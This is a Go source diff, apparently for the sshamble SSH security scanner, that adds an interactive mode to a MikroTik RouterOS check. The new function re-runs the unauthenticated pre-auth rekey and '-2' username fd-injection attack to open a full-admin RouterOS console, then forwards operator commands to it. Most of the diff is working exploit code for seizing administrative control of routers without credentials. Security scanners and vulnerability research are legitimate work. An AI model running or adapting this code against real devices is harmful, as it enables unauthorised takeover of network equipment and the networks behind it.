@@ -1,12 +1,17 @@
 package cmd
 
 import (
+	"bufio"
 	"bytes"
 	"fmt"
+	"io"
 	"net"
+	"os"
 	"regexp"
 	"strings"
 	"time"
+
+	"golang.org/x/term"
 
 	"github.com/runZeroInc/excrypto/x/crypto/ssh"
 	"github.com/runZeroInc/sshamble/auth"
@@ -53,15 +58,12 @@ func mikrotikFD2Squashed(raw []byte) string {
 	return strings.Join(strings.Fields(string(plain)), "")
 }
 
-func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
+// mikrotikFD2Options builds the base auth options that perform the
+// unauthenticated pre-auth rekey (CVE-2026-67279) with the rejected "-2"
+// username pending (CVE-2026-86060). The caller supplies the session handler.
+func mikrotikFD2Options(addr string, conf *ScanConfig, options *auth.Options) *auth.Options {
 	tname := checkVulnMikrotikFD2Inject
-	if !conf.IsCheckEnabled(tname) {
-		return nil
-	}
-
-	conf.Logger.Debugf("%s %s is running", addr, tname)
-
-	o := options.
+	return options.
 		WithUsername("-2").
 		WithIgnoreAuthError().
 		WithPostAuthHandler(func(c net.Conn, uac *ssh.UnauthClientConn, r *auth.AuthResult) error {
@@ -73,24 +75,137 @@ func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.
 			}
 			conf.Logger.Tracef("%s %s pre-auth rekey requested with '-2' pending", addr, tname)
 			return nil
-		}).
+		})
+}
+
+// mikrotikFD2OpenConsole requests a pty + shell on ses, injects the fd-2
+// identity block, and returns the session's stdin pipe.
+func mikrotikFD2OpenConsole(ses *ssh.Session) (io.WriteCloser, error) {
+	stdIn, err := ses.StdinPipe()
+	if err != nil {
+		return nil, err
+	}
+	if err := ses.RequestPty("vt100", 24, 80, ssh.TerminalModes{}); err != nil {
+		return nil, err
+	}
+	if err := ses.Shell(); err != nil {
+		return nil, err
+	}
+	if _, err := stdIn.Write(mikrotikFD2Block); err != nil {
+		return nil, err
+	}
+	return stdIn, nil
+}
+
+// sshInteractVulnMikrotikFD2Inject re-establishes the unauthenticated
+// CVE-2026-86060 full-admin console and drives it interactively. The RouterOS
+// console is a PTY that emits DECID/CPR sizing probes and can render
+// vertically; a background relay answers those probes and echoes console
+// output while the foreground loop forwards each stdin line as a command.
+func sshInteractVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
+	tname := checkVulnMikrotikFD2Inject
+
+	if fd := int(os.Stdin.Fd()); !term.IsTerminal(fd) {
+		conf.Logger.Errorf("%s %s interact requires a controlling terminal", addr, tname)
+		return nil
+	}
+
+	res := auth.SSHAuth(addr, mikrotikFD2Options(addr, conf, options).WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
+		_ = c.SetDeadline(time.Time{})
+		defer sclient.Close()
+
+		stdOut := auth.NewSyncByteBuffer(1024 * 64)
+		ses.Stdout = stdOut
+		ses.Stderr = stdOut
+		stdIn, err := mikrotikFD2OpenConsole(ses)
+		if err != nil {
+			return err
+		}
+		defer stdIn.Close()
+
+		fmt.Printf("\r\nMikroTik RouterOS admin console via '-2' fd injection on %s\r\n", addr)
+		fmt.Printf("Type RouterOS commands, or 'exit' to quit.\r\n\r\n")
+
+		// Relay console output to the terminal while answering the DECID/CPR
+		// probes the console uses to size itself.
+		stop := make(chan struct{})
+		defer close(stop)
+		go func() {
+			tick := time.NewTicker(time.Millisecond * 50)
+			defer tick.Stop()
+			emitted := 0
+			cprAnswered := 0
+			decidAnswered := false
+			for {
+				select {
+				case <-stop:
+					return
+				case <-tick.C:
+				}
+				raw := stdOut.Peek()
+				if len(raw) > emitted {
+					_, _ = os.Stdout.Write(raw[emitted:])
+					os.Stdout.Sync()
+					emitted = len(raw)
+				}
+				if !decidAnswered && bytes.Contains(raw, []byte("\x1bZ")) {
+					decidAnswered = true
+					_, _ = stdIn.Write([]byte("\x1b[?1;2c"))
+				}
+				if n := bytes.Count(raw, []byte("\x1b[6n")); cprAnswered < n {
+					for cprAnswered < n {
+						cprAnswered++
+						if _, err := stdIn.Write([]byte("\x1b[24;80R")); err != nil {
+							return
+						}
+					}
+				}
+			}
+		}()
+
+		reader := bufio.NewReader(os.Stdin)
+		for {
+			line, err := reader.ReadString('\n')
+			if err != nil {
+				if err == io.EOF {
+					return nil
+				}
+				return err
+			}
+			line = strings.TrimSpace(line)
+			if line == "" {
+				continue
+			}
+			switch strings.ToLower(line) {
+			case "exit", "quit", ".":
+				return nil
+			}
+			if _, err := stdIn.Write([]byte(line + "\r")); err != nil {
+				return err
+			}
+		}
+	}), auth.SSHAuthHandlerSingle(ssh.None()))
+
+	return res
+}
+
+func sshCheckVulnMikrotikFD2Inject(addr string, conf *ScanConfig, options *auth.Options, root *auth.AuthResult) *auth.AuthResult {
+	tname := checkVulnMikrotikFD2Inject
+	if !conf.IsCheckEnabled(tname) {
+		return nil
+	}
+
+	conf.Logger.Debugf("%s %s is running", addr, tname)
+
+	o := mikrotikFD2Options(addr, conf, options).
 		WithSessionHandler(func(c net.Conn, sclient *ssh.Client, ses *ssh.Session, r *auth.AuthResult) error {
 			_ = c.SetDeadline(time.Now().Add(time.Second * 25))
 
 			stdOut := auth.NewSyncByteBuffer(1024 * 64)
 			ses.Stdout = stdOut
 			ses.Stderr = stdOut
-			stdIn, err := ses.StdinPipe()
+			stdIn, err := mikrotikFD2OpenConsole(ses)
 			if err != nil {
-				return err
-			}
-			if err := ses.RequestPty("vt100", 24, 80, ssh.TerminalModes{}); err != nil {
-				return err
-			}
-			if err := ses.Shell(); err != nil {
-				return err
-			}
-			if _, err := stdIn.Write(mikrotikFD2Block); err != nil {
 				return err
 			}
 
